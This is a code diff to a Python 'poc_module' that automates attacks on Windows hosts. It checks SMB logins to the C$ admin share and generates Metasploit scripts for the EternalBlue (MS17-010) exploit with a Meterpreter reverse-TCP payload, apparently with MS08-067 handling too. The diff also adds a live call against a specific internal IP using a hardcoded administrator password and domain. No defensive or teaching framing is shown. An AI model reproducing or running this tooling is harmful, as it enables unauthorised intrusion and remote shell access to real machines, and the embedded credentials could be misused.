@@ -9,7 +9,7 @@ class poc_module:
         self.ip = ipaddress
     def smb_account_poc(self,username,password,domain):
         try:
-            smb = smbclient.SambaClient(server=ipaddress, share="C$", username=username, password=password, domain=domain)
+            smb = smbclient.SambaClient(server=self.ip, share="C$", username=username, password=password, domain=domain)
             exploit_folder = smb.listdir('/')
             return exploit_folder
         except:
@@ -19,7 +19,7 @@ class poc_module:
         #1 for bridege
         #2 localhost
         #3 vpn
-        lhost = subprocess.check_output(["hostname -I | awk '{print $3}'"],shell=True).decode("utf-8")
+        lhost = subprocess.check_output(["hostname -I | awk '{print $1}'"],shell=True).decode("utf-8")
         if module == "ms17010":
             file.write('use exploit/windows/smb/ms17_010_eternalblue \n')
             file.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp\n')
@@ -70,5 +70,4 @@ class poc_module:
         except:
             os.remove("ms08067configure.rc")
             return "NULL"
-
-# print(poc_module("10.10.115.190").ms17010_poc())
+print(poc_module("192.168.89.214").smb_account_poc("administrator","1qaz@WSX","alex-ad.local"))
